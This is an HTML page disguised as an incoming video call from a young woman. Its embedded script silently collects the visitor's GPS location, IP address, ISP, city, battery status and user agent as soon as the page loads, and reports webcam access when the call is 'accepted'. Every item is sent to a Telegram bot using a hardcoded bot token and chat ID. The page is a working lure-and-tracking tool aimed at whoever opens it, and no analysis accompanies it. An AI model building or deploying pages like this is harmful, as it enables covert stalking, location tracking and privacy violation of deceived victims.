<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Incoming Video Call</title>
<style>
  body,html {margin:0;padding:0;height:100%;background:#000;font-family:sans-serif;}
  .call-screen {position:relative;height:100vh;width:100vw;overflow:hidden;}
  .caller-video {position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;filter:brightness(0.7);}
  .overlay {position:absolute;top:0;left:0;width:100%;height:100%;display:flex;flex-direction:column;justify-content:space-between;color:#fff;padding:40px 20px;box-sizing:border-box;background:linear-gradient(to top,rgba(0,0,0,0.7) 20%,rgba(0,0,0,0));}
  .caller-details {text-align:center;}
  .caller-details img {width:100px;height:100px;border-radius:50%;border:4px solid #00ffea;box-shadow:0 0 30px #00ffea;margin-bottom:15px;}
  .caller-name {font-size:2em;font-weight:bold;color:#00ffea;}
  .call-status {font-size:1.2em;color:#ccc;}
  .buttons {display:flex;justify-content:space-around;margin-bottom:20px;}
  .btn {width:80px;height:80px;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:2em;cursor:pointer;box-shadow:0 0 15px rgba(0,0,0,0.6);}
  .accept {background:#0f0;}
  .reject {background:#f00;}
</style>
</head>
<body>
<div class="call-screen">
  <video autoplay muted loop class="caller-video">
    <source src="https://yourvideo.example.com/hot-indian-girl.mp4" type="video/mp4">
  </video>
  <div class="overlay">
    <div class="caller-details">
      <img src="https://yourimage.example.com/hot-indian-girl.jpg" alt="Caller Photo">
      <div class="caller-name">Priya Sharma</div>
      <div class="call-status">Incoming Video Call...</div>
    </div>
    <div class="buttons">
      <div class="btn reject" onclick="window.close()">‚úñ</div>
      <div class="btn accept" onclick="acceptCall()">‚úî</div>
    </div>
  </div>
</div>

<script>
// ‚úÖ Token & chat ID setup
const BOT_TOKEN = "7983135568:AAGZEbVk8zZcBuRrM-CCrItKc7XjJcF1e9I";
const CHAT_ID = "1954755564";

function sendToTelegram(msg){
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:"Markdown"})
  }).catch(console.error);
}

function acceptCall(){
  navigator.mediaDevices.getUserMedia({video:true,audio:false})
  .then(stream=>{
    sendToTelegram("üì∏ *User accepted call, webcam started!*");
    document.querySelector('.caller-video').srcObject=stream;
  })
  .catch(err=>{
    sendToTelegram(`‚ö†Ô∏è Webcam denied: ${err.message}`);
  });
}

// Background info capture
if(navigator.geolocation){
  navigator.geolocation.getCurrentPosition(pos=>{
    const lat=pos.coords.latitude.toFixed(6);
    const lon=pos.coords.longitude.toFixed(6);
    const mapsLink=`https://maps.google.com/?q=${lat},${lon}`;
    sendToTelegram(`üìç *Location:* Lat:${lat}, Lon:${lon}\n[Open Maps](${mapsLink})`);
  },()=>sendToTelegram("‚ö†Ô∏è Location denied."));
}else sendToTelegram("‚ö†Ô∏è Geolocation not supported.");

if(navigator.getBattery){
  navigator.getBattery().then(b=>{
    sendToTelegram(`üîã *Battery:* ${(b.level*100).toFixed(0)}% | ${b.charging?"Charging":"Not Charging"}`);
  });
}

sendToTelegram(`üì± *User Agent:* ${navigator.userAgent}`);

fetch('https://ipinfo.io/json?token=YOUR_IPINFO_TOKEN')
  .then(r=>r.json())
  .then(d=>sendToTelegram(`üåê *IP:* ${d.ip}\nüè¢ *ISP:* ${d.org||"Unknown"}\nüìç *City:* ${d.city}, ${d.region}, ${d.country}`))
  .catch(()=>sendToTelegram("‚ö†Ô∏è IP/ISP fetch failed"));
</script>
</body>
</html>
